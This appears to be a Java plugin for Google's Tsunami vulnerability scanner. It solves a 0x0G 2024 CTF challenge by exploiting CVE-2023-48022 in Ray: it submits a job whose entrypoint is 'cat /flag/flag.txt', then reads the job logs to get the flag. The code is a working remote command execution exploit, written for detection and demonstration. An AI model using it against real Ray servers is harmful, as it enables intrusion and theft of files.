/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.cve2023480220x0g;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.gson.JsonObject;
import com.google.gson.JsonParseException;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import javax.inject.Inject;

/** A VulnDetector plugin for CVE 202348022 that solves Tsunami CTF challenge at the 0xG 2024. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "CVE-2023-480220 0x0G Detector",
    version = "0.1",
    description =
        "This detector extracts the flag using CVE-2023-48022 in a special ray installation for"
            + " 0x0G 2024 Tsunami demo.",
    author = "Andrey Kovalev (avkov@google.com)",
    bootstrapModule = Cve2023480220x0gDetectorModule.class)
public final class Cve2023480220x0gDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final HttpClient httpClient;

  // Flag saved for the purpose listing in the detection report.
  private String flag;

  @Inject
  Cve2023480220x0gDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
    this.flag = null;
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private void setFlag(String flag) {
    this.flag = flag;
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    // Obtain the challenge flag from the service and store it in the class field for the report.
    var flag = this.exfiltrateFlag(networkService);
    if (flag != null) {
      this.setFlag(flag);
      return true;
    }
    return false;
  }

  private HttpRequest getNewJobRequest(NetworkService networkService, String apiEndpoint) {
    var rootUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    var body = "{\"entrypoint\": \"cat /flag/flag.txt\"}";
    return HttpRequest.post(rootUrl + apiEndpoint)
        .setHeaders(HttpHeaders.builder().addHeader("content-type", "application/json").build())
        .setRequestBody(ByteString.copyFromUtf8(body))
        .build();
  }

  private HttpRequest getJobLogsRequest(
      NetworkService networkService, String apiEndpoint, String jobId) {
    var rootUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    var logsUrl = rootUrl + apiEndpoint + jobId + "/logs";
    logger.atInfo().log("Generated job logs url: %s", logsUrl);
    return HttpRequest.get(logsUrl)
        .setHeaders(HttpHeaders.builder().addHeader("content-type", "application/json").build())
        .build();
  }

  private String exfiltrateFlag(NetworkService networkService) {
    try {
      // Create a new Ray job that runs the flag exfiltration command and obtain its id.
      var newJobResponseJson = sendNewJobRequest(networkService);
      if (newJobResponseJson.isEmpty()) {
        logger.atWarning().log("Failed to get new job response.");
        return "";
      }

      var jobId = newJobResponseJson.get("job_id").getAsString();
      if (jobId == null) {
        logger.atWarning().log("Failed to get job id from new job response.");
        return "";
      }

      logger.atInfo().log("Job Id: %s", jobId);

      // Wait for the job to finish.
      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(3));

      // Request the job logs by the job id. The logs should have flag value.
      var jobLogsResponseJson = sendJobLogsRequest(networkService, jobId);
      if (jobLogsResponseJson.isEmpty()) {
        logger.atWarning().log("Failed to get job logs json data.");
        return "";
      }

      var flag = jobLogsResponseJson.get("logs");
      logger.atInfo().log("Obtained 0x0G Challenge flag: %s", flag);
      return flag.getAsString();

      // Challenge server has a limited lifetime and sometimes generates unexpected EOF/EOI errors.
    } catch (JsonParseException e) {
      logger.atWarning().withCause(e).log("Failed to parse json response from the service.");
      return "";

    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send http requests to the service.");
      return "";
    }
  }

  private JsonObject sendNewJobRequest(NetworkService networkService) throws IOException {
    var emptyJson = new JsonObject();
    var newJobRequest = getNewJobRequest(networkService, "api/jobs/");
    var response = this.httpClient.send(newJobRequest, networkService);
    if (response.status().isSuccess()) {
      var jsonResponse = response.bodyJson();

      if (jsonResponse.isEmpty()) {
        logger.atWarning().log("New job request got empty response, check if the service is up.");
        return emptyJson;
      }
      return jsonResponse.get().getAsJsonObject();
    }
    return emptyJson;
  }

  private JsonObject sendJobLogsRequest(NetworkService networkService, String jobId)
      throws IOException {
    var emptyJson = new JsonObject();
    var jobLogsRequest = getJobLogsRequest(networkService, "api/jobs/", jobId);
    var response = this.httpClient.send(jobLogsRequest, networkService);
    if (response.status().isSuccess()) {
      var jsonResponse = response.bodyJson();
      if (jsonResponse.isEmpty()) {
        logger.atWarning().log("Job logs response is empty for job id: %s.", jobId);
        return emptyJson;
      }
      return jsonResponse.get().getAsJsonObject();
    }
    return emptyJson;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder().setPublisher("GOOGLE").setValue("CVE-2023-48022"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("CVE-2023-48022 Arbitrary Code Execution in Ray")
                .setDescription(
                    "This is Tsunami solution for 0x0G 2024 CTF challenge. The flag is: "
                        + this.flag
                        + "  .")
                .setRecommendation(
                    "There is no patch available as this is considered intended functionality."
                        + " Restrict access to Ray to be local only and do not expose it to the"
                        + " network."))
        .build();
  }
}

